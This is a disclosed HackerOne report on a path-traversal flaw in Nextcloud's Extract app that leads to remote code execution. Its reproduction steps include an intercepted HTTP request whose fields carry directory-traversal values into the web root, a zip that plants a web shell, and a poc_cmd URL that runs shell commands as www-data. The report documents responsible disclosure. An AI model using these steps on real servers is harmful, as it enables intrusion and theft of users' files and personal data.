# Remote code execution via path traversal in Zip extraction in the Extract app

## Report Details
- **Report ID**: 765291
- **URL**: https://hackerone.com/reports/765291
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-12-27T23:07:56.864Z
- **Disclosed**: 2020-03-07T12:54:55.538Z

## Reporter
- **Username**: emilvirkki
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
I realise this doesn't qualify for a reward, as it's a vulnerability in a third-party app, but as the app is part of the "official" VM image provided by Hansson IT, I think it's well worth fixing.

The Extract app doesn't validate the path or filename of a zip file to be extracted, allowing an attacker to create or overwrite arbitrary files.

How to reproduce
===

Install NextCloud using the VM image with default settings (with the extra security options).

Create a new user with no user group and log in as that user.

Upload the payload zip file (nextcloud-shell.zip, attached) to the root folder (or wherever you like). It contains a modified version of apps/files/App.php, necessary for getting the payload to run.

Click the "Extract here" option for the nextcloud-shell.zip and intercept the request. Modify the **request body** so the request looks something like the following. You need to replace "normaluser" with the username of the user you created in (2):

```
POST /index.php/apps/extract/ajax/extractHere.php HTTP/1.1
Host: 192.168.100.32
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: */*
Accept-Language: fi-FI,fi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: lv0G5+K7v/a3w30wOMyR35SvBgF35GHmiuoejP+8u7g=:w5s+qIPUj8aAohdpWojkiazdVXYRkwyp47t8ypHy/+4=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 55
Origin: https://192.168.100.32
DNT: 1
Connection: close
Cookie: ocmmdvtkydkx=1u2e2imt5h7g0pimv84eoqnfco; oc_sessionPassphrase=MXmMNXhcE3%2FpbZla9mKTYIS18lYG49cMP8lTHFrJfGe1jLxHd2hHfg8vYs1O6hFjv2IbkI31jhMeJnajKWNYzIb7G3f9UNiFmyKJwAbzPWLKY594ScipzPr6u%2BN9SUp3; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; nc_username=normaluser; nc_token=FkBWj5z2dOJS0v4putAyW2oL7tAEOc9Q; nc_session_id=1u2e2imt5h7g0pimv84eoqnfco

nameOfFile=../../../../../../mnt/ncdata/normaluser/files/nextcloud-shell.zip&directory=/../../../../var/www/nextcloud/apps/files/lib&external=0
```

Open the following URL (replace host ip with your actual install) and observe how the current user and group are printed: `https://192.168.100.32/apps/files/?dir=/&poc_cmd=whoami`. You can obviously change the poc_cmd parameter to run any command you like.

## Impact

The attacker can run any commands with the privileges of the www-data user. This allows the attacker to access and modify all the files and personally identifiable information in the installation.

## Attachments
- nextcloud-shell.zip
